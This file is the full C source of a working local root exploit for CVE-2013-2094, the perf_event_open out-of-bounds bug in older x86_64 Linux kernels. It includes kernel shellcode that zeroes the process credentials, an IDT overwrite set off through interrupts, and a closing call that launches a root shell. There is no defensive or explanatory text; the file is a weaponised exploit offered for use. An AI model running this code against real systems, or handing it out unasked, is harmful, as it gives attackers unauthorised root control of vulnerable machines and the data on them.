/*
 * CVE-2013-2094 exploit x86_64 Linux < 3.8.9
 * by sorbo (sorbo@darkircop.org) June 2013
 *
 * Based on sd's exploit.  Supports more targets.
 *
 */

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <signal.h>
#include <assert.h>

#define BASE		0x380000000
#define BASE_JUMP	0x1780000000
#define SIZE  		0x10000000
#define KSIZE		0x2000000

#define TMP(x) (0xdeadbeef + (x))

struct idt {
	uint16_t limit;
	uint64_t addr;
} __attribute__((packed));

static int _fd;

static int perf_open(uint64_t off)
{
	struct perf_event_attr attr;
	int rc;

//	printf("perf open %lx [%d]\n", off, (int) off);

	memset(&attr, 0, sizeof(attr));

	attr.type   	    = PERF_TYPE_SOFTWARE;
	attr.size   	    = sizeof(attr);
	attr.config 	    = off;
	attr.mmap   	    = 1;
	attr.comm   	    = 1;
	attr.exclude_kernel = 1;

	rc = syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);

	return rc;
}

void __sc_start(void);
void __sc_next(void);

void __sc(void)
{
	asm("__sc_start:\n"
	    "call __sc_next\n"
	    "iretq\n"
	    "__sc_next:\n");
}

void sc(void)
{
	int i, j;
	uint8_t *current = *(uint8_t **)(((uint64_t) &i) & (-8192));
	uint64_t kbase = ((uint64_t)current) >> 36;
	int uid = TMP(1);
	int gid = TMP(2);

	for (i = 0; i < 4000; i += 4) {
		uint64_t *p = (void *) &current[i];
		uint32_t *cred = (uint32_t*) p[0];

		if ((p[0] != p[1]) || ((p[0]>>36) != kbase))
			continue;

		for (j = 0; j < 20; j++) {
			if (cred[j] == uid && cred[j + 1] == gid) {
				for (i = 0; i < 8; i++) {
					cred[j + i] = 0;
					return;
				}
			}
		}
	}
}

static void sc_replace(uint8_t *sc, uint32_t needle, uint32_t val)
{
	void *p;

	p = memmem(sc, 900, &needle, sizeof(needle));
	if (!p)
		errx(1, "can't find %x", needle);

	memcpy(p, &val, sizeof(val));
}

static void *map_mem(uint64_t addr)
{
	void *p;

	p = mmap((void*) addr, SIZE, PROT_READ | PROT_WRITE,
		 MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);

	if (p == MAP_FAILED)
		err(1, "mmap()");

	return p;
}

static int find_mem(void *mem, uint8_t c)
{
	int i;
	uint8_t *p = mem;

	for (i = 0; i < SIZE; i++) {
		if (p[i] == c)
			return i;
	}

	return -1;
}

static void dropshell()
{
	if (setuid(0) != 0)
		errx(1, "failed");

	printf("Launching shell\n");

	execl("/bin/sh", "sh", NULL);
	exit(0);
}

void morte(int x)
{
	printf("Got signal\n");
	close(_fd);
	dropshell();
}

static void trigger(int intr)
{
	switch (intr) {
	case 0:
		do {
			int z = 1;
			int a = 1;

			z--;

			a /= z;
		} while (0);
		break;

	case 4:
		asm("int $4");
		break;

	case 0x80:
		asm("int $0x80");
		break;

	default:
		errx(1, "unknown intr %d", intr);
	}

	sleep(3);
}

int main(int argc, char *argv[])
{
	uint32_t *p[2];
	int fd, i;
	uint64_t off;
	uint64_t addr = BASE;
	struct idt idt;
	uint8_t *kbase;
	int sz = 4;
	int intr = 4;

	printf("Searchin...\n");

	p[0] = map_mem(BASE);
	p[1] = map_mem(BASE_JUMP);

	memset(p[1], 0x69, SIZE);

	off = 0xFFFFFFFFL;
	fd = perf_open(off);
	close(fd);

	i = find_mem(p[0], 0xff);
	if (i == -1) {
		i = find_mem(p[1], 0x68);

		if (i == -1)
			errx(1, "Can't find overwrite");

		sz = 24;
		addr = BASE_JUMP;
		printf("detected CONFIG_JUMP_LABEL\n");
	}

	munmap(p[0], SIZE);
	munmap(p[1], SIZE);

	addr += i;
	addr -= off * sz;

	printf("perf_swevent_enabled is at 0x%lx\n", addr);

	asm("sidt %0" : "=m" (idt));

	printf("IDT at 0x%lx\n", idt.addr);

	off = addr - idt.addr;
	off -= 8;

	switch (off % sz) {
	case 0:
		intr = 0;
		break;

	case 8:
		intr = 0x80;
		break;

	case 16:
		intr = 4;
		break;

	default:
		errx(1, "remainder %d", off % sz);
	}

	printf("Using interrupt %d\n", intr);

	off -= 16 * intr;

	assert((off % sz) == 0);

	off /= sz;
	off = -off;

//	printf("Offset %lx\n", off);

	kbase = (uint8_t*) (idt.addr & 0xFF000000);

	printf("Shellcode at %p\n", kbase);

	if (mmap(kbase, KSIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
	     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED)
		err(1, "mmap()");

	memset(kbase, 0x90, KSIZE);
	kbase += KSIZE - 1024;

	i = __sc_next - __sc_start;
	memcpy(kbase, __sc_start, i);
	kbase += i;
	memcpy(kbase, sc, 900);

	sc_replace(kbase, TMP(1), getuid());
	sc_replace(kbase, TMP(2), getgid());

	signal(SIGALRM, morte);
	alarm(2);

	printf("Triggering sploit\n");
	_fd = perf_open(off);

	trigger(intr);

	exit(0);
}